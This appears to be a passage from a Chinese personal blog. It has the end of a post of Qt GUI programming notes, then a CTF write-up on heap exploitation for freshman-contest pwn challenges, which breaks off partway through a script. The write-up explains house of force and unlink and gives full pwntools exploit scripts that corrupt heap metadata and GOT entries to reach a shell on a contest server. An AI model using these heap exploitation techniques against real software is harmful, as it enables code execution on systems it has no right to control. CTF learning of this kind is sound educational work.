class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置移动</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置内容</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("新建");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//添加分割线</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//工具栏添加控件</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"点这里"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure>
<h3 id="3-状态栏"><a href="#3-状态栏" class="headerlink" title="3.状态栏"></a>3.状态栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//状态栏</span></span><br><span class="line"><span class="comment">//状态栏可以有多个</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//设置到窗口</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//添加标签控件</span></span><br><span class="line"><span class="comment">//左侧提示</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"左侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//右侧提示</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"右侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure>
<h3 id="4-浮动窗口"><a href="#4-浮动窗口" class="headerlink" title="4.浮动窗口"></a>4.浮动窗口</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//铆接部件(浮动窗口)</span></span><br><span class="line"><span class="comment">//铆接部件 可以有多个</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"浮动"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//设置停靠区域</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure>
<h3 id="5-核心部件"><a href="#5-核心部件" class="headerlink" title="5.核心部件"></a>5.核心部件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置中心部件(只能有一个)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure>
<h2 id="0x05-资源文件"><a href="#0x05-资源文件" class="headerlink" title="0x05 资源文件"></a>0x05 资源文件</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p>
<h2 id="0x06-对话框"><a href="#0x06-对话框" class="headerlink" title="0x06 对话框"></a>0x06 对话框</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建按钮 弹出对话框</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class="line">        <span class="comment">//模态对话框 （不可以对其它窗口进行操作）</span></span><br><span class="line">        <span class="comment">//非模态对话框 （可以对其他窗口进行操作）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//模态对话框的创建</span></span><br><span class="line">        QDialog dlg(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//对话框的大小</span></span><br><span class="line">        dlg.resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//对话框阻塞</span></span><br><span class="line">        dlg.exec();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非模态对话框</span></span><br><span class="line">        QDialog *dlg2 = <span class="keyword">new</span> QDialog(<span class="keyword">this</span>);</span><br><span class="line">        dlg2-&gt;resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        dlg2-&gt;show();</span><br><span class="line">        <span class="comment">//关闭释放内存</span></span><br><span class="line">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="2-标准对话框"><a href="#2-标准对话框" class="headerlink" title="2.标准对话框"></a>2.标准对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//消息对话框</span></span><br><span class="line"><span class="comment">//错误对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::critical(this,"错误","错误");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//信息对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::information(this,"消息","消息");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提问对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 提示内容 参数4 按键类型</span></span><br><span class="line">QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class="line"><span class="keyword">if</span>(QMessageBox::Save==QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"保存"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-其他对话框"><a href="#3-其他对话框" class="headerlink" title="3.其他对话框"></a>3.其他对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//颜色对话框</span></span><br><span class="line"><span class="comment">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class="line"><span class="comment">//文件对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 目录 参数4 文件格式</span></span><br><span class="line"><span class="comment">//QString str = QFileDialog::getOpenFileName(this,"打开","c://","(*.txt)");</span></span><br><span class="line"><span class="comment">//字体对话框</span></span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">QFontDialog::getFont(&amp;flag,QFont(<span class="string">"华文彩云"</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure>
<h2 id="0x07-界面布局"><a href="#0x07-界面布局" class="headerlink" title="0x07 界面布局"></a>0x07 界面布局</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png" alt="image-20201210092318304"></p>
<h2 id="0x08-控件"><a href="#0x08-控件" class="headerlink" title="0x08 控件"></a>0x08 控件</h2><h3 id="1-按钮"><a href="#1-按钮" class="headerlink" title="1.按钮"></a>1.按钮</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png" alt="image-20201210100503686"></p>
<h3 id="2-树控件"><a href="#2-树控件" class="headerlink" title="2.树控件"></a>2.树控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//树控件的使用</span></span><br><span class="line"><span class="comment">//水平头</span></span><br><span class="line">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class="string">"英雄"</span> &lt;&lt; <span class="string">"英雄介绍"</span>);</span><br><span class="line"><span class="comment">//加载顶层的节点</span></span><br><span class="line">QTreeWidgetItem * liitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"力量"</span>);</span><br><span class="line">QTreeWidgetItem * spitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"速度"</span>);</span><br><span class="line">QTreeWidgetItem * faitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"法力"</span>);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure>
<h3 id="3-table控件"><a href="#3-table控件" class="headerlink" title="3.table控件"></a>3.table控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//table控件</span></span><br><span class="line">    <span class="comment">//设置列数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setColumnCount(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//设置水平表头</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class="string">"姓名"</span> &lt;&lt;<span class="string">"性别"</span> &lt;&lt; <span class="string">"年龄"</span>);</span><br><span class="line">    <span class="comment">//设置行数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//设置正文</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setItem(<span class="number">0</span>,<span class="number">0</span>,<span class="keyword">new</span> QTableWidgetItem(<span class="string">"压缩"</span>));</span><br><span class="line">    <span class="comment">//列表</span></span><br><span class="line">    QList&lt;QString&gt; namelist;</span><br><span class="line">    QStringList sexlist;</span><br><span class="line">    sexlist &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span>  &lt;&lt; <span class="string">"男"</span>；</span><br><span class="line">    namelist &lt;&lt; <span class="string">"ll"</span> &lt;&lt; <span class="string">"aa"</span> &lt;&lt; <span class="string">"11"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="4-其他控件"><a href="#4-其他控件" class="headerlink" title="4.其他控件"></a>4.其他控件</h3><p>需要的时去看库吧</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png" alt="image-20201210104641479"></p>
<h2 id="0x09-Qfile文件读写"><a href="#0x09-Qfile文件读写" class="headerlink" title="0x09 Qfile文件读写"></a>0x09 Qfile文件读写</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png" alt="image-20201214083900742"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png" alt="image-20201214083912652"></p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/">新生赛复现</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-06
        </span><span class="post-category">
            <a href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a>
            </span>
        <span class="post-visits"
             data-url="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
             data-title="新生赛复现">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>终于考完试了，这考前学真不是人干的，上课还是得听一听</p>
<p>复现一下这几道题，顺便学习堆的知识</p>
<hr>
<p>淦 我是fw 拖了五天 终于来复现了</p>
<p>但发现堆已经忘得差不多了</p>
<p>先复习堆的基础知识</p>
<p><a href="https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p>
<h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>官方wp</p>
<blockquote>
<p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p>
<p>关于house of force不懂得的可以参考这篇文章</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>
</blockquote>
<p>先来看一下house of force</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a><strong>house of force</strong></h2><p><strong>利用条件</strong></p>
<ul>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ul>
<p><strong>利用步骤</strong></p>
<p>(1)首先先泄露出堆地址。</p>
<p>(2)利用堆溢出，将top chunk的size域修改为很大的数</p>
<p>(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。</p>
<p>(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。</p>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<p>因为是第一次弄堆题 所以尽量弄得清楚一点</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png" alt="image-20201213122054112"></p>
<p>还未进入菜单 堆中情况</p>
<p>两个指针</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png" alt="image-20201213122653935"></p>
<p>添加一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">"aaaa"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png" alt="image-20201213140931866"></p>
<p>修改top chunk大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png" alt="image-20201213170620443"></p>
<p>这时 我们需要把top指针指向堆底，从而改变函数指针</p>
<p>那我们应该怎么申请大小呢，我们需要“后撤步”，就是负向申请地址。那大小呢，最起码应该是0x40+0x20，然后加上一个头需要的地址（0xf）与尾部top前可用的空间（0x8）。</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png" alt="image-20201213175814153"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>负向申请然后打过去，然后这里应该可以只要申请足够大 然后把里面内容全覆盖为后门函数 直接调用应该都可以</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>可以去看我刚总结的堆</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level = 'debug'</span><br><span class="line">p = process('./pwn5')</span><br><span class="line">#p = remote('219.219.61.234','10014')</span><br><span class="line">elf = ELF('./pwn5')</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line">def add(<span class="built_in">size</span>,con):</span><br><span class="line">	p.sendlineafter('Your choice:','2')</span><br><span class="line">	p.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class="line">	p.sendafter('Plz input the name:',con)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter('Your choice:','4')</span><br><span class="line">	p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter('Your choice:','1')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">change</span><span class="params">(idx,<span class="built_in">size</span>,con)</span>:</span></span><br><span class="line">    p.sendlineafter('Your choice:','3')</span><br><span class="line">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class="line">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class="line">buf = <span class="number">0x06020b8</span></span><br><span class="line">sys = <span class="number">0x400D1B</span></span><br><span class="line">add(0x60,'ccc')</span><br><span class="line">add(0x58,'aaa')</span><br><span class="line">add(0x80,'bbb')</span><br><span class="line">add(0x60,'eee')</span><br><span class="line">add(0x60,'fff')</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(buf - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x50</span>)+p8(<span class="number">0x90</span>) </span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0x60</span>)*<span class="number">3</span>+ p64(<span class="number">0x6020a8</span>))</span><br><span class="line">change(1,0x40,p64(elf.got['free']))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,p64(sys)*<span class="number">2</span>)</span><br><span class="line"><span class="meta"># delete(3)</span></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote>
<p>change函数中存在单字节溢出漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; 	printf(&quot;Content of heap : &quot;);</span><br><span class="line">	read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">	puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p>
<p>泄露出libc基地址，修改got表，最后get_shell</p>
</blockquote>
<p>毕竟一开始做堆题，上来先分析，尽量详细点</p>
<blockquote>
<p>add函数</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png" alt="image-20201219204952738"></p>
<p>其中数据结构为</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png" alt="image-20201219205027638"></p>
<p>change函数</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png" alt="image-20201219205113774"></p>
</blockquote>
<p>直接看exp分析吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    